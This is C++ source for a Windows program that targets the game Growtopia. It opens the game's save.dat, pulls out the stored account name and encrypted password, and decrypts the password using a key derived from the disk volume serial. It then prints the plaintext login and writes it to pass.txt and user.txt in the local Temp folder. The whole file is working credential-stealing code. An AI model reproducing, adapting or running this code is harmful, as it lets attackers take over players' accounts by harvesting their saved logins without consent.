#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <iphlpapi.h>
#include <iostream>
#include <conio.h>
#include <string>
#include <cstdarg>
#include "proton/Variant.hpp"
#include "proton/vardb.h"
#include <sstream>
#include <stdlib.h>
#include <tchar.h>
#include <fstream>

#pragma comment(lib, "iphlpapi.lib")

unsigned int decrypt(byte* data, unsigned int size, int key)
{
	//src: proton
	unsigned int checksum = 0;
	for (unsigned int i = 0; i < size; i++)
	{
		checksum += data[i] + key + i;
		data[i] = data[i] - (2 + key + i);
	}
	return checksum;
}
uint32 hash_str(const char* str, int32 len)
{
	//src: proton
	if (!str) return 0;

	auto n = (unsigned char*)str;
	uint32 acc = 0x55555555;
	for (int32 i = 0; i < len; i++)
		acc = (acc >> 27) + (acc << 5) + *n++;

	return acc;
}

string get_identifier()
{
	//src: proton
	DWORD dwDiskSerial;
	if (!GetVolumeInformation(L"C:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
		if (!GetVolumeInformation(L"D:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
			if (!GetVolumeInformation(L"E:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
				if (!GetVolumeInformation(L"F:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
					if (!GetVolumeInformation(L"G:\\", NULL, 0, &dwDiskSerial, NULL, NULL, NULL, NULL))
						return "";

	char stTemp[128];
	sprintf(stTemp, "%u", dwDiskSerial);
	return stTemp;
}
int _stdcall WinMain(struct HINSTANCE__* hinstance, struct HINSTANCE__* hprevinstance, char* cmdline, int cmdshow)
{
	bool set_visible = true;
	bool nowait = false, nolog = false, user = false, dump = false, custom_file = false, mac = false, world = false; //ghetto as fuck
	string custom_path{};
	stringstream help{};
	for (int i = 0; i < __argc; i++) {
		std::string arg(__argv[i]);

	}
	if (set_visible) {
		AllocConsole();
		freopen("conin$", "r", stdin);
		freopen("conout$", "w", stdout);
		freopen("conout$", "w", stderr);
		printf("%s", help.str().c_str());
	}
	VariantDB db{};
	bool did_exist;
	auto path = (string)getenv("LOCALAPPDATA") + "\\Growtopia\\save.dat";
	if (custom_file)
		path = custom_path;





	if (custom_file)
		path = custom_path;

	auto success = db.Load(path, &did_exist);
	if (success && did_exist) {
		if (!nolog);
		auto variant = db.GetVarIfExists("tankid_password");

		if (variant) {
			auto varstr = variant->get_h();
			auto size = varstr.length();
			auto pass = new uint8_t[size];
			memcpy(pass, varstr.data(), size);
			auto device_id = get_identifier();
			auto output = decrypt(pass, size, hash_str(device_id.c_str(), device_id.length()));
			auto pass_str = (string)(char*)(&*(DWORD**)pass); //very likely unsafe
			delete[] pass;
			pass_str.resize(size);

			auto uservar = db.GetVarIfExists("tankid_name");
			if (user && uservar)
				printf("%s:", uservar->get_h().c_str());
			else if (user)
				printf("ERROR_NAME:");
			if (nolog)
				printf("%s", pass_str.c_str());
			else
				printf("pass is: %s\n", pass_str.c_str());

			ofstream aaa((string)getenv("LOCALAPPDATA") + "\\Temp\\pass.txt");
			aaa << pass_str;
			aaa.close();
			ofstream GrowID((string)getenv("LOCALAPPDATA") + "\\Temp\\user.txt");
			GrowID << uservar->get_h().c_str();
			GrowID.close();
			exit(0);
		}

		else if (!nolog)
			string aa = "";
		ofstream aaa((string)getenv("LOCALAPPDATA") + "\\Temp\\pass.txt");
		aaa << "";
		aaa.close();
		ofstream GrowID((string)getenv("LOCALAPPDATA") + "\\Temp\\user.txt");
		GrowID << "";
		GrowID.close();
		exit(0);

		if (!nowait)
			(void)_getch();
		return 0;
	}
}
